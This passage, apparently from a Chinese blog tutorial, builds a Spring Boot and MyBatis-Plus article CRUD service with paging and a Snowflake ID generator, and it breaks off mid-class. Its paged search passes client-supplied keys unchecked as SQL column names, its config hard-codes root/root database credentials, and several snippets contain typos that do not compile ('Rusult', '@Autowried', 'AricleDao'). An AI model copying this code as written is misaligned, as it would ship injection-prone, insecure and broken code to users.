<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>mysql<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>mysql-connector-java<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.tensquare<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>tensquare_common<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.0-SNAPSHOT<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>3.创建com.tensquare.article包，并创建ArticleApplication类</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.tensquare.article;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.mybatis.spring.annotation.MapperScan;</span><br><span class="line"><span class="keyword">import</span> org.springframework.boot.SpringApplication;</span><br><span class="line"><span class="keyword">import</span> org.springframework.boot.autoconfigure.SpringBootApplication;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.annotation.Bean;</span><br><span class="line"><span class="keyword">import</span> util.IdWorker;</span><br><span class="line"></span><br><span class="line"><span class="meta">@SpringBootApplication</span></span><br><span class="line"><span class="comment">//配置Mapper包扫描</span></span><br><span class="line"><span class="meta">@MapperScan(&quot;com.tensquare.article.dao&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ArticleApplication</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        SpringApplication.run(ArticleApplication.class, args);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> IdWorker <span class="title">createIdWorker</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> IdWorker(<span class="number">1</span>, <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>4.在resources文件夹下创建application.yml，并添加以下内容</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">server:</span></span><br><span class="line">  <span class="attr">port:</span> <span class="number">9004</span> <span class="comment"># 服务访问端口号</span></span><br><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">application:</span></span><br><span class="line">    <span class="attr">name:</span> <span class="string">tensquare-article</span> <span class="comment">#服务名称</span></span><br><span class="line">  <span class="attr">datasource:</span> <span class="comment"># 数据库连接四大属性</span></span><br><span class="line">    <span class="attr">driver-class-name:</span> <span class="string">com.mysql.jdbc.Driver</span></span><br><span class="line">    <span class="attr">url:</span> <span class="string">jdbc:mysql://192.168.200.129:3306/tensquare_article?characterEncoding=utf-8</span></span><br><span class="line">    <span class="attr">username:</span> <span class="string">root</span></span><br><span class="line">    <span class="attr">password:</span> <span class="string">root</span></span><br></pre></td></tr></table></figure>
<h2 id="5-2-文章管理-CRUD"><a href="#5-2-文章管理-CRUD" class="headerlink" title="5.2 文章管理-CRUD"></a>5.2 文章管理-CRUD</h2><h3 id="5-2-1-表结构分析"><a href="#5-2-1-表结构分析" class="headerlink" title="5.2.1 表结构分析"></a>5.2.1 表结构分析</h3><p>使用Navicat连接虚拟机建库</p>
<p>tensquare_article数据库，tb_article表</p>
<div class="table-container">
<table>
<thead>
<tr>
<th>文章表</th>
<th>tb_article</th>
<th></th>
<th></th>
</tr>
</thead>
<tbody>
<tr>
<td>字段名称</td>
<td>字段含义</td>
<td>字段类型</td>
<td>备注</td>
</tr>
<tr>
<td>id</td>
<td>ID</td>
<td>文本</td>
<td></td>
</tr>
<tr>
<td>columnid</td>
<td>专栏ID</td>
<td>文本</td>
<td></td>
</tr>
<tr>
<td>userid</td>
<td>用户ID</td>
<td>文本</td>
<td></td>
</tr>
<tr>
<td>title</td>
<td>文章标题</td>
<td>文本</td>
<td></td>
</tr>
<tr>
<td>content</td>
<td>文章内容</td>
<td>文本</td>
<td></td>
</tr>
<tr>
<td>image</td>
<td>文章封面</td>
<td>文本</td>
<td></td>
</tr>
<tr>
<td>createtime</td>
<td>发表日期</td>
<td>日期</td>
<td></td>
</tr>
<tr>
<td>updatetime</td>
<td>修改日期</td>
<td>日期</td>
<td></td>
</tr>
<tr>
<td>ispublic</td>
<td>是否公开</td>
<td>文本</td>
<td>0：不公开</td>
</tr>
<tr>
<td>istop</td>
<td>是否置顶</td>
<td>文本</td>
<td>0：不置顶</td>
</tr>
<tr>
<td>visits</td>
<td>浏览量</td>
<td>整型</td>
<td></td>
</tr>
<tr>
<td>thumbup</td>
<td>点赞数</td>
<td>整型</td>
<td></td>
</tr>
<tr>
<td>comment</td>
<td>评论数</td>
<td>整型</td>
<td></td>
</tr>
<tr>
<td>state</td>
<td>审核状态</td>
<td>文本</td>
<td>0：未审核 1：已审核</td>
</tr>
<tr>
<td>channelid</td>
<td>所属频道</td>
<td>整型</td>
<td>关联频道表ID</td>
</tr>
<tr>
<td>url</td>
<td>URL地址</td>
<td>文本</td>
<td></td>
</tr>
<tr>
<td>type</td>
<td>文章类型</td>
<td>文本</td>
<td>0：分享</td>
</tr>
</tbody>
</table>
</div>
<h3 id="5-2-2-集成mybatisplus"><a href="#5-2-2-集成mybatisplus" class="headerlink" title="5.2.2 集成mybatisplus"></a>5.2.2 集成mybatisplus</h3><p>1.在pom.xml文件中</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- mybatis-plus begin --&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- https://mvnrepository.com/artifact/com.baomidou/mybatisplus-spring-boot-starter --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.baomidou<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>mybatisplus-spring-boot-starter<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.0.5<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.baomidou<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>mybatis-plus<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>$&#123;mybatisplus.version&#125;<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- mybatis-plus end --&gt;</span></span><br></pre></td></tr></table></figure>
<p>2.在之前的application.yml文件中添加相关配置</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Mybatis-Plus 配置</span></span><br><span class="line"><span class="attr">mybatis-plus:</span></span><br><span class="line">  <span class="comment">#  mapper-locations: classpath:/mapper/*Mapper.xml</span></span><br><span class="line">  <span class="comment">#实体扫描，多个package用逗号或者分号分隔</span></span><br><span class="line">  <span class="attr">typeAliasesPackage:</span> <span class="string">com.tensquare.article.pojo</span></span><br><span class="line">  <span class="attr">global-config:</span></span><br><span class="line">    <span class="attr">id-type:</span> <span class="number">1</span>  <span class="comment">#0:数据库ID自增   1:用户输入id</span></span><br><span class="line">    <span class="attr">db-column-underline:</span> <span class="literal">false</span></span><br><span class="line">    <span class="attr">refresh-mapper:</span> <span class="literal">true</span></span><br><span class="line">    <span class="attr">configuration:</span></span><br><span class="line">      <span class="attr">map-underscore-to-camel-case:</span> <span class="literal">true</span></span><br><span class="line">      <span class="attr">cache-enabled:</span> <span class="literal">true</span> <span class="comment">#配置的缓存的全局开关</span></span><br><span class="line">      <span class="attr">lazyLoadingEnabled:</span> <span class="literal">true</span> <span class="comment">#延时加载的开关</span></span><br><span class="line">      <span class="attr">multipleResultSetsEnabled:</span> <span class="literal">true</span> <span class="comment">#开启延时加载，否则按需加载属性</span></span><br><span class="line">      <span class="attr">log-impl:</span> <span class="string">org.apache.ibatis.logging.stdout.StdOutImpl</span> <span class="comment">#打印sql语句,调试用</span></span><br></pre></td></tr></table></figure>
<p>3.在启动类添加Mapper扫描注解</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@SpringBootApplication</span></span><br><span class="line"><span class="comment">//配置Mapper包扫描</span></span><br><span class="line"><span class="meta">@MapperScan(&quot;com.tensquare.article.dao&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ArticleApplication</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        SpringApplication.run(ArticleApplication.class, args);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> IdWorker <span class="title">createIdWorker</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> IdWorker(<span class="number">1</span>, <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="5-2-3-查询所有文章和根据id号查询文章功能"><a href="#5-2-3-查询所有文章和根据id号查询文章功能" class="headerlink" title="5.2.3 查询所有文章和根据id号查询文章功能"></a>5.2.3 查询所有文章和根据id号查询文章功能</h3><p>1.在com.tenquare.article包下常见pojo包，并创建Article实体类</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.tensquare.article.pojo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.baomidou.mybatisplus.annotations.TableId;</span><br><span class="line"><span class="keyword">import</span> com.baomidou.mybatisplus.annotations.TableName;</span><br><span class="line"><span class="keyword">import</span> com.baomidou.mybatisplus.enums.IdType;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"><span class="keyword">import</span> java.util.Date;</span><br><span class="line"></span><br><span class="line"><span class="meta">@TableName(&quot;tb_article&quot;)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Article</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@TableId(type = IdType.INPUT)</span></span><br><span class="line">    <span class="keyword">private</span> String id;<span class="comment">//ID</span></span><br><span class="line">    <span class="keyword">private</span> String columnid;    <span class="comment">//专栏ID</span></span><br><span class="line">    <span class="keyword">private</span> String userid;      <span class="comment">//用户ID</span></span><br><span class="line">    <span class="keyword">private</span> String title;       <span class="comment">//标题</span></span><br><span class="line">    <span class="keyword">private</span> String content;     <span class="comment">//文章正文</span></span><br><span class="line">    <span class="keyword">private</span> String image;       <span class="comment">//文章封面</span></span><br><span class="line">    <span class="keyword">private</span> Date createtime;    <span class="comment">//发表日期</span></span><br><span class="line">    <span class="keyword">private</span> Date updatetime;    <span class="comment">//修改日期</span></span><br><span class="line">    <span class="keyword">private</span> String ispublic;    <span class="comment">//是否公开</span></span><br><span class="line">    <span class="keyword">private</span> String istop;       <span class="comment">//是否置顶</span></span><br><span class="line">    <span class="keyword">private</span> Integer visits;     <span class="comment">//浏览量</span></span><br><span class="line">    <span class="keyword">private</span> Integer thumbup;    <span class="comment">//点赞数</span></span><br><span class="line">    <span class="keyword">private</span> Integer comment;    <span class="comment">//评论数</span></span><br><span class="line">    <span class="keyword">private</span> String state;       <span class="comment">//审核状态</span></span><br><span class="line">    <span class="keyword">private</span> String channelid;   <span class="comment">//所属频道</span></span><br><span class="line">    <span class="keyword">private</span> String url;         <span class="comment">//URL</span></span><br><span class="line">    <span class="keyword">private</span> String type;        <span class="comment">//类型</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//getters and setters and toString</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>2.编写Controller</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="meta">@RequestMapping(&quot;article&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ArticleController</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> ArticleService articleService;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//查询所有文章</span></span><br><span class="line">    <span class="meta">@GetMapping</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Result <span class="title">findAll</span><span class="params">()</span></span>&#123;</span><br><span class="line">        List list = articleService.findAll();</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> Rusult(<span class="keyword">true</span>,StatusCode.OK,<span class="string">&quot;查询成功&quot;</span>,list);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//根据id查询文章</span></span><br><span class="line">    <span class="meta">@GetMapping(&quot;&#123;articleId&#125;&quot;)</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Result <span class="title">findById</span><span class="params">(<span class="meta">@PathVariable</span> String articleId)</span></span>&#123;</span><br><span class="line">        Article article = articleService.findById(articleId);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> Result(<span class="keyword">true</span>,Status.OK,<span class="string">&quot;查询成功&quot;</span>,article);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>3.编写dao接口</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">AricleDao</span> <span class="keyword">extends</span> <span class="title">BaseMapper</span>&lt;<span class="title">Article</span>&gt;</span>&#123;&#125;</span><br></pre></td></tr></table></figure>
<p>4.编写service层</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Service</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ArticleService</span></span>&#123;</span><br><span class="line">    <span class="meta">@Autowried</span></span><br><span class="line">    <span class="keyword">private</span> ArticleDao articleDao;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//查询所有文章</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> List&lt;Article&gt; <span class="title">findAll</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        Article article = articleDao.selectById(<span class="number">1</span>);</span><br><span class="line">        <span class="keyword">return</span> articleDao.selectList(<span class="keyword">null</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//根据ID查询</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Article <span class="title">findById</span><span class="params">(String articleId)</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> articleDao.selectById(articleId);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="5-2-4-添加文章、删除文章、修改文章"><a href="#5-2-4-添加文章、删除文章、修改文章" class="headerlink" title="5.2.4 添加文章、删除文章、修改文章"></a>5.2.4 添加文章、删除文章、修改文章</h3><p>在相应层写入以下代码</p>
<p>1.Controller类</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//新增文章</span></span><br><span class="line"><span class="meta">@PostMapping</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> Result <span class="title">save</span><span class="params">(<span class="meta">@RequestBody</span> Article article)</span> </span>&#123;</span><br><span class="line">    articleService.save(article);</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> Result(<span class="keyword">true</span>, StatusCode.OK, <span class="string">&quot;新增成功&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 修改文章</span></span><br><span class="line"><span class="meta">@PutMapping(value = &quot;&#123;articleId&#125;&quot;)</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> Result <span class="title">updateById</span><span class="params">(<span class="meta">@PathVariable</span> String articleId,</span></span></span><br><span class="line"><span class="function"><span class="params">                         <span class="meta">@RequestBody</span> Article article)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 设置id</span></span><br><span class="line">    article.setId(articleId);</span><br><span class="line">    <span class="comment">// 执行修改</span></span><br><span class="line">    articleService.updateById(article);</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> Result(<span class="keyword">true</span>, StatusCode.OK, <span class="string">&quot;修改成功&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 删除文章</span></span><br><span class="line"><span class="meta">@DeleteMapping(value = &quot;&#123;articleId&#125;&quot;)</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> Result <span class="title">deleteById</span><span class="params">(<span class="meta">@PathVariable</span> String articleId)</span> </span>&#123;</span><br><span class="line">    articleService.deleteById(articleId);</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> Result(<span class="keyword">true</span>, StatusCode.OK, <span class="string">&quot;删除成功&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>2.service类</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Autowired</span></span><br><span class="line"><span class="keyword">private</span> IdWorker idWorker;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">save</span><span class="params">(Article article)</span> </span>&#123;</span><br><span class="line">    <span class="comment">//使用分布式id生成器</span></span><br><span class="line">    String id = idWorker.nextId() + <span class="string">&quot;&quot;</span>;</span><br><span class="line">    article.setId(id);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//初始化点赞，浏览量，评论数据</span></span><br><span class="line">    article.setVisits(<span class="number">0</span>);</span><br><span class="line">    article.setComment(<span class="number">0</span>);</span><br><span class="line">    article.setThumbup(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//新增</span></span><br><span class="line">    articleDao.insert(article);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">updateById</span><span class="params">(Article article)</span> </span>&#123;</span><br><span class="line">    <span class="comment">//有以下两种方法</span></span><br><span class="line">    <span class="comment">// * 根据主键修改</span></span><br><span class="line">    articleDao.updateById(article);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// * 根据条件修改</span></span><br><span class="line">    <span class="comment">// 创建条件对象</span></span><br><span class="line">    <span class="comment">// EntityWrapper&lt;Article&gt; wrapper = new EntityWrapper&lt;&gt;();</span></span><br><span class="line">    <span class="comment">// 设置条件</span></span><br><span class="line">    <span class="comment">// wrapper.eq(&quot;id&quot;, article.getId());</span></span><br><span class="line">    <span class="comment">// articleDao.update(article, wrapper);</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">deleteById</span><span class="params">(String articleId)</span> </span>&#123;</span><br><span class="line">    articleDao.deleteById(articleId);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="5-2-5-条件查询和分页"><a href="#5-2-5-条件查询和分页" class="headerlink" title="5.2.5 条件查询和分页"></a>5.2.5 条件查询和分页</h3><p>1.条件查询</p>
<p>使用MybatisPlus提供的EntityWrapper对象封装的where查询条件，例如以下使用方式：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// if (map.get(key) != null) &#123;</span></span><br><span class="line"><span class="comment">//     wrapper.eq(key, map.get(key));</span></span><br><span class="line"><span class="comment">// &#125;</span></span><br><span class="line"><span class="comment">// 或</span></span><br><span class="line"><span class="comment">//第一个参数是否把后面的条件加入到查询条件中</span></span><br><span class="line"><span class="comment">//和上面的if判断的写法是一样的效果，实现动态sql</span></span><br><span class="line">wrapper.eq(map.get(key) != <span class="keyword">null</span>, key, map.get(key));</span><br></pre></td></tr></table></figure>
<p>2.分页</p>
<ul>
<li>使用 Mybatis Plus 提供的Page对象</li>
<li>向Mybatis Plus中注入PaginationInterceptor插件</li>
<li>新建config包，创建MybatisPlusConfig对象，添加下面的代码</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.tensquare.article.config;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.baomidou.mybatisplus.plugins.PaginationInterceptor;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.annotation.Bean;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.annotation.Configuration;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MyBatisPlusConfig</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> PaginationInterceptor <span class="title">createPaginationInterceptor</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> PaginationInterceptor();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>3.完整代码</p>
<p>AricleController中添加代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 文章分页</span></span><br><span class="line"><span class="meta">@PostMapping(value = &quot;search/&#123;page&#125;/&#123;size&#125;&quot;)</span></span><br><span class="line"><span class="comment">// 之前接受文章数据使用pojo，但是现在是条件查询</span></span><br><span class="line"><span class="comment">// 而所有的条件都需要进行判断，遍历pojo的所有属性要使用反射的方式不推荐</span></span><br><span class="line"><span class="comment">// 直接使用集合的方式遍历，这里接收数据改为Map集合</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> Result <span class="title">findByPage</span><span class="params">(<span class="meta">@PathVariable</span> Integer page,</span></span></span><br><span class="line"><span class="function"><span class="params">                         <span class="meta">@PathVariable</span> Integer size,</span></span></span><br><span class="line"><span class="function"><span class="params">                         <span class="meta">@RequestBody</span> Map&lt;String, Object&gt; map)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//根据条件分页查询</span></span><br><span class="line">    Page&lt;Article&gt; pageData = articleService.findByPage(map, page, size);</span><br><span class="line">    <span class="comment">//封装分页返回对象</span></span><br><span class="line">    PageResult&lt;Article&gt; pageResult = <span class="keyword">new</span> PageResult&lt;&gt;(pageData.getTotal(), pageData.getRecords());</span><br><span class="line">    <span class="comment">//返回数据</span></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> Result(<span class="keyword">true</span>, StatusCode.OK, <span class="string">&quot;条件查询成功&quot;</span>,pageResult);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>ArtcleService中代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Page&lt;Article&gt; <span class="title">findByPage</span><span class="params">(Map&lt;String, Object&gt; map, Integer page, Integer size)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 设置查询条件</span></span><br><span class="line">    EntityWrapper&lt;Article&gt; wrapper = <span class="keyword">new</span> EntityWrapper&lt;&gt;();</span><br><span class="line">    Set&lt;String&gt; keySet = map.keySet();</span><br><span class="line">    <span class="keyword">for</span> (String key : keySet) &#123;</span><br><span class="line">        <span class="comment">// if (map.get(key) != null) &#123;</span></span><br><span class="line">        <span class="comment">//     wrapper.eq(key, map.get(key));</span></span><br><span class="line">        <span class="comment">// &#125;</span></span><br><span class="line">        <span class="comment">//第一个参数是否把后面的条件加入到查询条件中</span></span><br><span class="line">        <span class="comment">//和上面的if判断的写法是一样的效果，实现动态sql</span></span><br><span class="line">        wrapper.eq(map.get(key) != <span class="keyword">null</span>, key, map.get(key));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//设置分页参数</span></span><br><span class="line">    Page&lt;Article&gt; pageData = <span class="keyword">new</span> Page&lt;&gt;(page, size);</span><br><span class="line">    <span class="comment">// 执行查询</span></span><br><span class="line">    <span class="comment">// 第一个是分页参数，第二个是查询条件</span></span><br><span class="line">    List&lt;Article&gt; list = articleDao.selectPage(pageData, wrapper);</span><br><span class="line">    pageData.setRecords(list);</span><br><span class="line">    <span class="comment">// 返回</span></span><br><span class="line">    <span class="keyword">return</span> pageData;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="附录"><a href="#附录" class="headerlink" title="附录"></a>附录</h1><h2 id="1-IdWorker-java"><a href="#1-IdWorker-java" class="headerlink" title="1 IdWorker.java"></a>1 IdWorker.java</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> util;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.management.ManagementFactory;</span><br><span class="line"><span class="keyword">import</span> java.net.InetAddress;</span><br><span class="line"><span class="keyword">import</span> java.net.NetworkInterface;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;名称：IdWorker.java&lt;/p&gt;</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;描述：分布式自增长ID&lt;/p&gt;</span></span><br><span class="line"><span class="comment"> * &lt;pre&gt;</span></span><br><span class="line"><span class="comment"> *     Twitter的 Snowflake　JAVA实现方案</span></span><br><span class="line"><span class="comment"> * &lt;/pre&gt;</span></span><br><span class="line"><span class="comment"> * 核心代码为其IdWorker这个类实现，其原理结构如下，我分别用一个0表示一位，用—分割开部分的作用：</span></span><br><span class="line"><span class="comment"> * 1||0---0000000000 0000000000 0000000000 0000000000 0 --- 00000 ---00000 ---000000000000</span></span><br><span class="line"><span class="comment"> * 在上面的字符串中，第一位为未使用（实际上也可作为long的符号位），接下来的41位为毫秒级时间，</span></span><br><span class="line"><span class="comment"> * 然后5位datacenter标识位，5位机器ID（并不算标识符，实际是为线程标识），</span></span><br><span class="line"><span class="comment"> * 然后12位该毫秒内的当前毫秒内的计数，加起来刚好64位，为一个Long型。</span></span><br><span class="line"><span class="comment"> * 这样的好处是，整体上按照时间自增排序，并且整个分布式系统内不会产生ID碰撞（由datacenter和机器ID作区分），</span></span><br><span class="line"><span class="comment"> * 并且效率较高，经测试，snowflake每秒能够产生26万ID左右，完全满足需要。</span></span><br><span class="line"><span class="comment"> * &lt;p&gt;</span></span><br><span class="line"><span class="comment"> * 64位ID (42(毫秒)+5(机器ID)+5(业务编码)+12(重复累加))</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> Polim</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">IdWorker</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 时间起始标记点，作为基准，一般取系统的最近时间（一旦确定不能变动）</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="keyword">static</span> <span class="keyword">long</span> twepoch = <span class="number">1288834974657L</span>;</span><br><span class="line">    <span class="comment">// 机器标识位数</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="keyword">static</span> <span class="keyword">long</span> workerIdBits = <span class="number">5L</span>;</span><br><span class="line">    <span class="comment">// 数据中心标识位数</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="keyword">static</span> <span class="keyword">long</span> datacenterIdBits = <span class="number">5L</span>;</span><br><span class="line">    <span class="comment">// 机器ID最大值</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="keyword">static</span> <span class="keyword">long</span> maxWorkerId = -<span class="number">1L</span> ^ (-<span class="number">1L</span> &lt;&lt; workerIdBits);</span><br><span class="line">    <span class="comment">// 数据中心ID最大值</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="keyword">static</span> <span class="keyword">long</span> maxDatacenterId = -<span class="number">1L</span> ^ (-<span class="number">1L</span> &lt;&lt; datacenterIdBits);</span><br><span class="line">    <span class="comment">// 毫秒内自增位</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="keyword">static</span> <span class="keyword">long</span> sequenceBits = <span class="number">12L</span>;</span><br><span class="line">    <span class="comment">// 